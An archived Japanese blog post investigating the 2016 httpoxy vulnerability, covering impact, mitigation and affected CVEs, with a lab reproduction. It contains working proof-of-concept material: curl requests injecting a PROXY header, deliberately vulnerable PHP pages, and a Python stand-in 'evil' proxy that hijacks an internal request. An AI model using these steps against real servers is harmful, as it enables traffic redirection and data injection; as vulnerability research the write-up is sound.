@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>httpoxy脆弱性について調査</title>
+  <meta name="description" content="概要">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://kosukeshimofuji.jp/2016/07/19/httpoxy/">
+  <link rel="alternate" type="application/rss+xml" title="Kosuke Shimofuji's Home Page" href="https://kosukeshimofuji.jp/feed.xml">
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-80482518-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+      <meta property="og:url" content="https://kosukeshimofuji.jp/2016/07/19/httpoxy/" />
+  
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="httpoxy脆弱性について調査 | Kosuke Shimofuji's Home Page" />
+  
+
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Kosuke Shimofuji's Home Page</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+          <a class="page-link" href="/links/">Links</a>
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <p class="post-meta">Posted date: <time datetime="2016-07-19T12:00:00+09:00"
+        itemprop="datePublished">2016-07-19 12:00:00 +0900</time></p>
+    <h1 class="post-title" itemprop="name headline">httpoxy脆弱性について調査</h1>
+  </header>
+
+  
+    <h2>Table of contents</h2>
+  
+  
+  <div class="post-content" itemprop="articleBody">
+  <ul class="section-nav">
+<li class="toc-entry toc-h1"><a href="#概要">概要</a></li>
+<li class="toc-entry toc-h1"><a href="#影響">影響</a></li>
+<li class="toc-entry toc-h1"><a href="#解決策緩和策">解決策、緩和策</a></li>
+<li class="toc-entry toc-h1"><a href="#cveの列挙">CVEの列挙</a></li>
+<li class="toc-entry toc-h2"><a href="#cve-2016-5385についての検証">CVE-2016-5385についての検証</a></li>
+<li class="toc-entry toc-h1"><a href="#http_proxy_変数">HTTP_PROXY_*変数</a></li>
+<li class="toc-entry toc-h1"><a href="#まとめ">まとめ</a></li>
+<li class="toc-entry toc-h1"><a href="#参考文献">参考文献</a></li>
+</ul><h1 id="section">
+<a id="概要" class="anchor" href="#%E6%A6%82%E8%A6%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>概要</h1>
+
+<p>CGIはHTTPリクエストで渡されたPROXYヘッダの値をHTTP_PROXY変数として保存しますが、HTTP_PROXY変数はHTTPクライアントにおいてPROXYの設定用に使われる変数であるため、攻撃者はHTTPクライアントに任意のHTTPプロキシを使用させることができます。</p>
+
+<h1 id="section-1">
+<a id="影響" class="anchor" href="#%E5%BD%B1%E9%9F%BF" aria-hidden="true"><span class="octicon octicon-link"></span></a>影響</h1>
+
+<p>環境変数が保持されるのはセッション毎なのか、プロセス毎なのかで影響範囲は異なります。ただ、多くのアプリケーションはセッション毎であるはずで、セッション毎ではないのは別の意味で脆弱だと思われるので、ここでは環境変数はセッション毎に保持される前提とします。
+また、2種類の攻撃に分けて考える必要があると思います。</p>
+
+<ul>
+  <li>第三者のHTTPリクエストを改竄して任意のPROXYを強制的に設定する</li>
+</ul>
+
+<p>この攻撃については中間者攻撃などのHTTPリクエストを改竄させる攻撃を併用する必要があります。攻撃者の目的がリクエストの改竄や傍受であるならば、中間者攻撃が達成できている時点で目的を達成できる条件は揃っているわけですので、この攻撃が実行される可能性は低いと考えています。</p>
+
+<ul>
+  <li>攻撃者自身のHTTPリクエストに任意のPROXYを設定する</li>
+</ul>
+
+<p>このような攻撃が実行される時、攻撃者が焦点を当てているのは、アプリケーション内部の通信を自分の制御下にあるproxyを通すことで内部仕様の把握やアプリケーションに悪意のあるデータを挿入しようとしていると考えられます。しかし、アプリケーション内部で起こる通信がTLS化されている場合、攻撃者が得ることができるのは暗号化された通信のみとなります。もしAPI通信などの通信が平文で行われていた場合、攻撃者はhttpoxyを利用してアプリケーションの仕様を把握し、不正なデータの挿入などを試みる可能性があります。</p>
+
+<h1 id="section-2">
+<a id="解決策緩和策" class="anchor" href="#%E8%A7%A3%E6%B1%BA%E7%AD%96%E7%B7%A9%E5%92%8C%E7%AD%96" aria-hidden="true"><span class="octicon octicon-link"></span></a>解決策、緩和策</h1>
+
+<p>2016/07/19日現在、パッチは出ていないので、PROXYヘッダーを無効する対応を<a href="https://httpoxy.org/#fix-now">httpoxyの公式サイト</a>では推奨されています。</p>
+
+<h1 id="cve">
+<a id="cveの列挙" class="anchor" href="#cve%E3%81%AE%E5%88%97%E6%8C%99" aria-hidden="true"><span class="octicon octicon-link"></span></a>CVEの列挙</h1>
+
+<p>httpoxyは様々なソフトウェアに影響があるため、複数のCVE番号が関連します。</p>
+
+<ul>
+  <li>CVE-2016-5385 - PHP</li>
+  <li>CVE-2016-5386 - Go</li>
+  <li>CVE-2016-5387 - Apache HTTPD</li>
+  <li>CVE-2016-1000104 - mod_fcgi</li>
+  <li>CVE-2016-1000105 - Nginx cgi script</li>
+  <li>CVE-2016-5388 - Tomcat</li>
+  <li>CVE-2016-1000107 - Erlang HTTP Server</li>
+  <li>CVE-2016-1000108 - YAWS</li>
+  <li>CVE-2016-1000109 - HHVM FastCGI</li>
+  <li>CVE-2016-1000110 - Python CGIHandler</li>
+  <li>CVE-2016-1000111 - Python twisted</li>
+</ul>
+
+<h2 id="cve-2016-5385">
+<a id="cve-2016-5385についての検証" class="anchor" href="#cve-2016-5385%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%81%AE%E6%A4%9C%E8%A8%BC" aria-hidden="true"><span class="octicon octicon-link"></span></a>CVE-2016-5385についての検証</h2>
+
+<ul>
+  <li>情報源
+    <ul>
+      <li><a href="https://www.kb.cert.org/vuls/byid?query=CVE-2016-5385&amp;searchview=">CERT</a></li>
+      <li><a href="https://security-tracker.debian.org/tracker/CVE-2016-5385">Debian</a></li>
+      <li><a href="https://github.com/search?q=%22CVE-2016-5385%22">Github</a></li>
+      <li><a href="https://lwn.net/Search/DoSearch?words=CVE-2016-5385">LWN</a></li>
+      <li><a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5385">NVD</a></li>
+      <li><a href="https://packetstormsecurity.com/search/?q=CVE-2016-5385">PacketStorm</a></li>
+      <li><a href="https://access.redhat.com/security/cve/CVE-2016-5385">Redhat</a></li>
+      <li><a href="https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5385.html">Ubuntu</a></li>
+      <li><a href="https://marc.info/?s=CVE-2016-5385&amp;l=bugtraq">bugtraq</a></li>
+      <li><a href="https://www.exploit-db.com/search/?action=search&amp;cve=2016-5385">exploitdb</a></li>
+      <li><a href="https://marc.info/?s=CVE-2016-5385&amp;l=full-disclosure">fulldisc</a></li>
+      <li><a href="https://www.rapid7.com/db/search?q=CVE-2016-5385">metasploit</a></li>
+      <li><a href="https://marc.info/?s=CVE-2016-5385&amp;l=oss-security">oss-sec</a></li>
+    </ul>
+  </li>
+  <li>検証環境</li>
+</ul>
+
+<div class="highlighter-rouge">
+<pre class="highlight"><code>$ lsb_release -a
+No LSB modules are available.
+Distributor ID: Debian
+Description:    Debian GNU/Linux 8.5 (jessie)
+Release:        8.5
+Codename:       jessie
+$ dpkg -l | egrep 'apache|php'
+ii  apache2                        2.4.10-10+deb8u4            amd64        Apache HTTP Server
+ii  php5                           5.6.23+dfsg-0+deb8u1        all          server-side, HTML-embedded scripting language (metapackage)
+</code></pre>
+</div>
+
+<p>まずはHTTPヘッダーを渡すことでHTTP_PROXY変数を埋めることができるのかどうかを確認します。</p>
+
+<ul>
+  <li>test.php</li>
+</ul>
+
+<div class="language-php highlighter-rouge">
+<pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>title httpoxy proof of concept<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY'</span><span class="p">)</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<ul>
+  <li>attack</li>
+</ul>
+
+<div class="highlighter-rouge">
+<pre class="highlight"><code>$ curl -H 'PROXY:HTTPOXY VLUN' http://scapegoat.test/test.php
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>title httpoxy proof of concept<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+HTTPOXY VLUN
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<p>HTTP_PROXY変数に任意の値を格納することに成功しました。これが一体どういう問題を起こすのでしょうか？
+Guzzile4系のようなHTTP_PROXY環境変数を利用するHTTPクライアントを利用すると問題は顕在化します。</p>
+
+<ul>
+  <li>guzzle4.0.1のインストール</li>
+</ul>
+
+<div class="highlighter-rouge">
+<pre class="highlight"><code>curl -sS https://getcomposer.org/installer | php
+php composer.phar require guzzlehttp/guzzle:~4.0.1
+</code></pre>
+</div>
+
+<p>guzzleの最新版は6系です。4系はEOLになっており、脆弱性を発現させるために故意に導入しています。
+次に脆弱なphpファイルを作成します。test.phpは内部でHTTPクライアントを作成して、ok.phpのレスポンスを表示します。</p>
+
+<ul>
+  <li>test.php</li>
+</ul>
+
+<div class="highlighter-rouge">
+<pre class="highlight"><code>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>title httpoxy proof of concept<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="cp">&lt;?php
+if (getenv('HTTP_PROXY') == false) {
+    echo "HTTP_PROXY variable is false";
+}else{
+    echo "HTTP_PROXY variable is ".getenv('HTTP_PROXY');
+}
+require 'vendor/autoload.php';
+$client = new GuzzleHttp\Client();
+$res = $client-&gt;get('http://scapegoat.test/ok.php');
+
+echo "OK.php return response is " . $res-&gt;getBody();
+?&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<ul>
+  <li>ok.php</li>
+</ul>
+
+<div class="highlighter-rouge">
+<pre class="highlight"><code>&lt;?php
+echo "OK";
+?&gt;
+</code></pre>
+</div>
+
+<p>攻撃者は悪意のあるproxyサーバを自分のコントロール下で構築します。ここで用意しているのはproxyとは名ばかりの貧弱なHTTPサーバになっています。</p>
+
+<ul>
+  <li>proxy.py</li>
+</ul>
+
+<div class="language-python highlighter-rouge">
+<pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">http.server</span>
+<span class="kn">import</span> <span class="nn">socketserver</span>
+<span class="kn">import</span> <span class="nn">io</span>
+
+<span class="n">HTTP_PORT</span> <span class="o">=</span> <span class="mi">4000</span>
+
+<span class="k">class</span> <span class="nc">httpoxy</span><span class="p">(</span><span class="n">http</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="nb">bytes</span> <span class="o">=</span> <span class="s">"Evil"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">)</span>
+        <span class="k">return</span>
+
+<span class="n">httpd</span> <span class="o">=</span> <span class="n">socketserver</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="s">""</span><span class="p">,</span> <span class="n">HTTP_PORT</span><span class="p">),</span> <span class="n">httpoxy</span><span class="p">)</span>
+<span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre>
+</div>
+
+<p>まずは正常なリクエストを見てみます。</p>
+
+<div class="language-bash highlighter-rouge">
+<pre class="highlight"><code><span class="gp">$ </span>curl http://scapegoat.test/test.php
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;title httpoxy proof of concept&lt;/title&gt;
+&lt;body&gt;
+HTTP_PROXY variable is <span class="nb">false
+</span>OK.php <span class="k">return </span>response is OK&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</div>
+
+<p>ok.phpにより<strong>OK</strong>という文字列が表示されています。 次に攻撃者によって悪意あるproxyサーバに強制的に接続され、そのサーバから返答を受け取った例を見てみます。</p>
+
+<div class="language-bash highlighter-rouge">
+<pre class="highlight"><code><span class="gp">$ </span>curl -H <span class="s1">'PROXY: 192.168.10.103:4000'</span> http://scapegoat.test/test.php
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;title httpoxy proof of concept&lt;/title&gt;
+&lt;body&gt;
+HTTP_PROXY variable is 192.168.10.103:4000
+OK.php <span class="k">return </span>response is Evil&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</div>
+
+<p><strong>OK</strong>と表示されていた箇所に<strong>Evil</strong>と表示されています。この時、答えを返しているのは悪意あるproxyであり、ok.phpにはリクエストが飛ぶことはありません。</p>
+
+<h1 id="httpproxy">
+<a id="http_proxy_変数" class="anchor" href="#http_proxy_%E5%A4%89%E6%95%B0" aria-hidden="true"><span class="octicon octicon-link"></span></a>HTTP_PROXY_*変数</h1>
+
+<p><a href="https://blogs.akamai.com/2016/07/akamai-mitigates-httpoxy-vulnerability.html">akamai</a>ではHTTP_PROXY変数の他の以下の変数が潜在的な影響を受けたと報告しています。</p>
+
+<ul>
+  <li>HTTP_PROXY_PASS</li>
+  <li>HTTP_PROXY_USER</li>
+  <li>HTTP_PROXY_HOST</li>
+  <li>HTTP_PROXY_PORT</li>
+</ul>
+
+<p>CVE-2016-5385についての検証で利用した検証環境を用いて上記変数への影響があるのかを検証します。</p>
+
+<div class="language-php highlighter-rouge">
+<pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>title httpoxy proof of concept<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="cp">&lt;?php</span>
+
+<span class="c1">// HTTP_PROXY
+</span><span class="k">if</span> <span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY'</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY variable is false"</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY variable is "</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="c1">// HTTP_PROXY_USER
+</span><span class="k">if</span> <span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_USER'</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_USER variable is false"</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_USER variable is "</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_USER'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="c1">// HTTP_PROXY_PASS
+</span><span class="k">if</span> <span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_PASS'</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_PASS variable is false"</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_PASS variable is "</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_PASS'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="c1">// HTTP_PROXY_HOST
+</span><span class="k">if</span> <span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_HOST'</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_HOST variable is false"</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_HOST variable is "</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_HOST'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="c1">// HTTP_PROXY_PORT
+</span><span class="k">if</span> <span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_PORT'</span><span class="p">)</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_PORT variable is false"</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"HTTP_PROXY_PORT variable is "</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">'HTTP_PROXY_PORT'</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<div class="highlighter-rouge">
+<pre class="highlight"><code>$ curl -H 'PROXY: VLUN' -H 'PROXY_USER: VLUN' -H 'PROXY_PASS: VLUN' -H 'PROXY_HOST: VLUN' -H 'PROXY_PORT: VLUN'  http://scapegoat.test/test.php
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>title httpoxy proof of concept<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+HTTP_PROXY variable is VLUN
+HTTP_PROXY_USER variable is false
+HTTP_PROXY_PASS variable is false
+HTTP_PROXY_HOST variable is false
+HTTP_PROXY_PORT variable is false
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<p>上記<a href="https://kosukeshimofuji.jp/2016/07/19/httpoxy/#cve-2016-5385%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%81%AE%E6%A4%9C%E8%A8%BC">検証環境</a>ではHTTP_PROXY変数以外は汚染することができませんでした。</p>
+
+<h1 id="section-3">
+<a id="まとめ" class="anchor" href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-hidden="true"><span class="octicon octicon-link"></span></a>まとめ</h1>
+
+<ul>
+  <li>中間者攻撃と併用して第三者を攻撃するメリットはないように思える。</li>
+  <li>内部のAPI通信にHTTPSを使っていれば、攻撃者ができるのは暗号化された通信を溜め込んでおくことぐらいになる。</li>
+</ul>
+
+<h1 id="section-4">
+<a id="参考文献" class="anchor" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE" aria-hidden="true"><span class="octicon octicon-link"></span></a>参考文献</h1>
+
+<ul>
+  <li><a href="https://httpoxy.org/">httpoxy脆弱性の公式ページ</a></li>
+  <li><a href="http://seclists.org/oss-sec/2016/q3/95">osssec</a></li>
+  <li><a href="https://blogs.akamai.com/2016/07/akamai-mitigates-httpoxy-vulnerability.html">Akamai Mitigates httpoxy Vulnerability</a></li>
+</ul>
+
+
+  </div>
+
+  <style type="text/css">
+<!--
+/*** sahre button settings ***/
+
+/* adjusting twitter share button */
+ul.share-buttons{
+  margin : 0;
+  list-style: none;
+  padding: 0;
+}
+
+ul.share-buttons li{
+  display: inline;
+}
+
+/* adjusting facebook share button */
+.fb_iframe_widget > span {
+  vertical-align: baseline !important;
+}
+
+/* adjusting google share button */
+#___plusone_0{ width:72px !important; }
+.___plusone_0 > span {
+  vertical-align: baseline !important;
+}
+
+/* adjusting pocket share button */
+.pocket-btn {
+    display: inline;
+}
+-->
+</style>
+
+<!-- twitter share script -->
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<!-- hatena share script -->
+<script type="text/javascript" src="https://b.st-hatena.com/js/bookmark_button.js" charset="utf-8" async="async"></script>
+
+<!-- facebook sahre script -->
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.6";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<!-- google sahre script -->
+<script src="https://apis.google.com/js/platform.js" async defer>
+ang: 'ja'}
+</script>
+
+<script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+
+<ul class="share-buttons" >
+    <li>
+        <!-- twitter share button -->
+    <a href="https://twitter.com/share"
+       class="twitter-share-button"
+       data-url="https://kosukeshimofuji.jp/2016/07/19/httpoxy/"
+       data-text="httpoxy脆弱性について調査 | Kosuke Shimofuji's Home Page" >Tweet</a>
+    </li>
+    <li>
+        <!-- facebook share button -->
+        <div class="fb-share-button"
+             data-href="https://kosukeshimofuji.jp/2016/07/19/httpoxy/"
+             data-layout="button_count"></div>
+    </li>
+    <li>
+        <!-- hatena share button -->
+        <a href="http://b.hatena.ne.jp/entry/https://kosukeshimofuji.jp/2016/07/19/httpoxy/"
+           class="hatena-bookmark-button"
+           data-hatena-bookmark-layout="simple-balloon"
+           data-hatena-bookmark-title="httpoxy脆弱性について調査 | Kosuke Shimofuji's Home Page"
+           data-hatena-bookmark-lang="ja"
+           title="Share on Hatena">
+            <img src="https://b.st-hatena.com/images/entry-button/button-only@2x.png"
+                 alt="Share on Hatena" width="20" height="20" style="border: none;" />
+        </a>
+    </li>
+    <li>
+        <!-- google share button -->
+        <div class="g-plusone"
+             data-href="https://kosukeshimofuji.jp/2016/07/19/httpoxy/"></div>
+    </li>
+    <li>
+        <!-- pocket share button -->
+        <a data-pocket-label="pocket" data-pocket-count="horizontal" class="pocket-btn" data-lang="en"></a>
+    </li>
+</ul>
+
+
+  <br>
+  <div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    /*
+    var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = '//kosukesimofuji-hp.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+  <div class="site-footer-wrapper">
+    <div id="footer-description">Think about cyber warfare, business warfare.
+</div>
+    <br>
+    <a href="mailto:kosuke.shimofuji@gmail.com"><?xml version="1.0" encoding="utf-8"?>
+<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
+<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" overflow="scroll" xml:space="preserve">
+<path fill="#231F20" d="M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M19.188,72.951V72.85
+	l24.708-23.145l6.103,5.597l5.967-5.472l24.682,23.121H19.188z M80.81,70.861l-23.635-22.14L80.81,27.048L49.999,50L19.188,27.048
+	l23.499,21.547L19.188,70.609V27.048H80.81V70.861z"/>
+</svg>
+</a>
+    <a href="/feed.xml"><?xml version="1.0" encoding="utf-8"?>
+<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
+<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" overflow="visible" xml:space="preserve">
+<path fill="#231F20" d="M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M35.379,70.782h-0.02
+	c-3.111,0-5.646-2.531-5.658-5.641c-0.002-3.119,2.529-5.668,5.646-5.68c3.133,0,5.669,2.529,5.673,5.641
+	C41.03,68.221,38.502,70.768,35.379,70.782z M51.874,70.718c-0.401-11.855-9.782-20.759-22.214-21.064l-0.02-7.672
+	c16.59,0.357,29.486,12.781,29.916,28.711L51.874,70.718z M67.979,70.658c-0.446-20.681-17.11-36.818-38.362-37.105l-0.021-7.674
+	C55.152,26.154,75.201,45.65,75.66,70.625L67.979,70.658z"/>
+</svg>
+</a>
+    <a href="https://github.com/KosukeShimofuji"><?xml version="1.0" encoding="utf-8"?>
+<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
+<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" xml:space="preserve">
+<path fill="#231F20" d="M50.141,61.976c3.769,0,6.824,1.903,6.824,4.251s-3.055,4.251-6.824,4.251s-6.824-1.903-6.824-4.251
+	S46.372,61.976,50.141,61.976z M49.23,29.299c2.584,0,4.678,2.632,4.678,5.878s-2.094,5.878-4.678,5.878s-4.678-2.632-4.678-5.878
